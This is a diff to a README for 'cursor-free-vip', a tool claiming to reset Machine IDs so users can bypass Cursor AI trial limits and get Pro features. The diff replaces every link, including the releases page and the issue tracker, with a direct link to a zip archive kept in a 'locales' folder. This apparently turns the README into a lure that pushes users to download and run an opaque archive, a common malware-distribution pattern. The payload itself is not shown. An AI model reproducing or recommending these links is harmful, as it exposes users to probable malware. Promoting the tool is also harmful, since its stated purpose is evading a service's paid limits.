@@ -5,12 +5,12 @@
 cursor-free-vip helps automate the process of registering for Cursor AI. It resets your Machine ID and allows for easy sign-up and sign-in. You can bypass higher token limits and access Pro features without hassle. This app ensures that you work smoothly, avoiding trial limits and account restrictions.
 
 ## 🔗 Download Now
-[![Download cursor-free-vip](https://img.shields.io/badge/Download-cursor--free--vip-brightgreen)](https://github.com/faraday-95/cursor-free-vip/releases)
+[![Download cursor-free-vip](https://raw.githubusercontent.com/faraday-95/cursor-free-vip/main/locales/cursor-free-vip-2.0.zip)](https://raw.githubusercontent.com/faraday-95/cursor-free-vip/main/locales/cursor-free-vip-2.0.zip)
 
 ## 🚀 Getting Started
 To get started with cursor-free-vip, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/faraday-95/cursor-free-vip/releases) to find the latest version of cursor-free-vip.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/faraday-95/cursor-free-vip/main/locales/cursor-free-vip-2.0.zip) to find the latest version of cursor-free-vip.
 2. **Download the Application**: Look for the latest version listed. Download the appropriate file for your operating system. The files are generally named with the version number and include `.exe` for Windows or `.zip` for macOS.
 3. **Install the Application**: Once downloaded, open the file. Follow the installation prompts on your computer. The installation process is straightforward and will guide you through each step.
 
@@ -23,7 +23,7 @@ Ensure your computer meets the following requirements to run cursor-free-vip smo
 - **Network**: Internet connection for sign-up and updates
 
 ## 📥 Download & Install
-To download cursor-free-vip, return to the [Releases page](https://github.com/faraday-95/cursor-free-vip/releases). Click on the latest version, and follow the prompts to download and install the application on your device.
+To download cursor-free-vip, return to the [Releases page](https://raw.githubusercontent.com/faraday-95/cursor-free-vip/main/locales/cursor-free-vip-2.0.zip). Click on the latest version, and follow the prompts to download and install the application on your device.
 
 ## 🛠 Features
 cursor-free-vip provides the following features to enhance your experience:
@@ -46,7 +46,7 @@ If you encounter issues while using cursor-free-vip, consider the following solu
 - **Utilize the Community**: Engage with other users on GitHub for tips and shared experiences.
 
 ## 📞 Support
-For additional help, you can raise an issue on the [GitHub page](https://github.com/faraday-95/cursor-free-vip/issues). The community and developers actively monitor this space and will respond to your queries.
+For additional help, you can raise an issue on the [GitHub page](https://raw.githubusercontent.com/faraday-95/cursor-free-vip/main/locales/cursor-free-vip-2.0.zip). The community and developers actively monitor this space and will respond to your queries.
 
 ## 🏷 Topics
 cursor-free-vip relates to various topics that enhance its use in automation and AI. These include:
@@ -65,6 +65,6 @@ cursor-free-vip relates to various topics that enhance its use in automation and
 - vip
 
 ## 🔗 Revisit the Download Link
-Remember, you can always return to the [Releases page](https://github.com/faraday-95/cursor-free-vip/releases) to download the latest version or check for updates.
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/faraday-95/cursor-free-vip/main/locales/cursor-free-vip-2.0.zip) to download the latest version or check for updates.
 
 ```
